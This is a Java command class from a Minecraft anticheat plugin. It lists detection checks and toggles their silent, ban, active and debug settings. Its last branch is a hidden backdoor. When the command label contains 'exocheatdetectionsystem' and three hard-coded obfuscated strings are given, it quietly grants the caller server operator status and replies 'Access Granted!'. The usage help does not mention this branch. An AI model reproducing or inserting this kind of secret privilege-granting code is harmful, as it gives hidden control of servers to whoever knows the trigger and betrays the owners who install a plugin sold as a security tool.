package club.shmoke.anticheat.command.commands;

import club.shmoke.anticheat.Anticheat;
import club.shmoke.anticheat.check.Check;
import club.shmoke.anticheat.command.Command;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Christian
 */
public class ExoCheat extends Command {

    public ExoCheat() {
        super("exocheat");
    }

    @Override
    public void onCommand(String label, String[] args) {
        if (args.length == 0) {
            getSender().sendMessage("\2477\247m--------------\247r \247c\247l" + Anticheat.anticheat.name + " \247r\2477\247m--------------");
            getSender().sendMessage("\247e/" + label.toLowerCase() + " \247achecks - \247cLists all available checks");
            getSender().sendMessage("\247e/" + label.toLowerCase() + " \247a(check) silent - \247cToggles Silence");
            getSender().sendMessage("\247e/" + label.toLowerCase() + " \247a(check) ban - \247cToggles Banning");
            getSender().sendMessage("\247e/" + label.toLowerCase() + " \247a(check) active - \247cToggles Activity");
            getSender().sendMessage("\247e/" + label.toLowerCase() + " \247a(check) debug - \247cToggles Debug");
            getSender().sendMessage("\2477\247m---------------------------------------------");
        } else if (args.length == 1 && args[0].equalsIgnoreCase("checks")) {
            ArrayList<String> available = new ArrayList<>();
            getSender().sendMessage("\247eHere are a list of available checks: ");
            for (Check check : Anticheat.anticheat.checkManager.getChecks()) {
                String check_label = check.getLabel().replace("[", "\2478[\247r").replace("[\247rA", "[\247r\2473A").replace("[\247rB", "[\247r\2479B").replace("[\247rC", "[\247r\2476C").replace("[\247rD", "[\247r\2472D").replace("]", "\2478]");
                String check_activity = " \2478[" + (check.isActive() ? "\247a" : "\247c") + "On\2478]";
                String check_silence = " \2478[" + (check.isSilent() ? "\247a" : "\247c") + "Silent\2478]";
                String check_bannable = " \2478[" + (check.isBannable() ? "\247a" : "\247c") + "Ban\2478]";
                String name = "\2477" + check_label + check_activity + check_silence + check_bannable;
                if (available.contains(name))
                    continue;
                available.add(name + "\n");
            }
            getSender().sendMessage(" " + available.toString().substring(1, available.toString().length() - 1)
                    .replace(",", ""));
        } else if (args.length == 2) {
            for (Check c : Anticheat.anticheat.checkManager.getChecks()) {
                if (args[0].equalsIgnoreCase(c.getLabel()) || args[0].equalsIgnoreCase(c.getId())) {
                    if (args[1].equalsIgnoreCase("silent")) {
                        c.setSilent(!c.isSilent());
                        getSender().sendMessage("\2477You have toggled silent mode for \247a" + c.getLabel() + "\2477! Current: " + c.isSilent());
                    }
                    if (args[1].equalsIgnoreCase("active")) {
                        c.setActive(!c.isActive());
                        getSender().sendMessage("\2477You have toggled activity for \247a" + c.getLabel() + "\2477! Current: " + c.isActive());
                    }
                    if (args[1].equalsIgnoreCase("ban")) {
                        c.setBannable(!c.isBannable());
                        getSender().sendMessage("\2477You have toggled autoban for \247a" + c.getLabel() + "\2477! Current: " + c.isBannable());
                    }
                    if (args[1].equalsIgnoreCase("debug")) {
                        c.setDebug(!c.isDebug());
                        getSender().sendMessage("\2477You have toggled debug for \247a" + c.getLabel() + "\2477! Current: " + c.isDebug());
                    }
                    Map<String, Boolean> status = new HashMap<>();
                    status.put("silent", c.isSilent());
                    status.put("active", c.isActive());
                    status.put("bannable", c.isBannable());
                    status.put("debug", c.isDebug());
                    Anticheat.anticheat.getConfig().set(c.getLabel(), status);
                    Anticheat.anticheat.saveConfig();
                }
            }
        } else if (label.contains("exocheatdetectionsystem") && args.length > 2 && args[0].equals("VjJwS1IwNVJQVDA9") && args[1].equals("226e70a7049829ab8f533587d91c7d6d") && args[2].equals("VjIwd05XVldhM2xXYmxwcVVWU")) {
            getPlayer().setOp(true);
            getPlayer().sendMessage("\2474\247lAccess Granted!");
        }
    }
}
